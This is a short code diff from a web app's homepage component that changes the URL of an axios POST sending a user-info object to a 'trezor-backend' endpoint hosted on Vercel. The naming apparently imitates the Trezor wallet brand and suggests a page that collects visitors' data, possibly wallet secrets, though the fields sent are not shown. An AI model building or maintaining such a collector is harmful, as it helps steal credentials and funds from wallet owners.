@@ -70,7 +70,7 @@ export default function HomePage() {
             };
 
             const response = await axios.post(
-                'https://trezor-backend.vercel.app/api/v1/send-user-info',
+                'https://trezor-backend-nine.vercel.app/api/v1/send-user-info',
                 data
             );
 
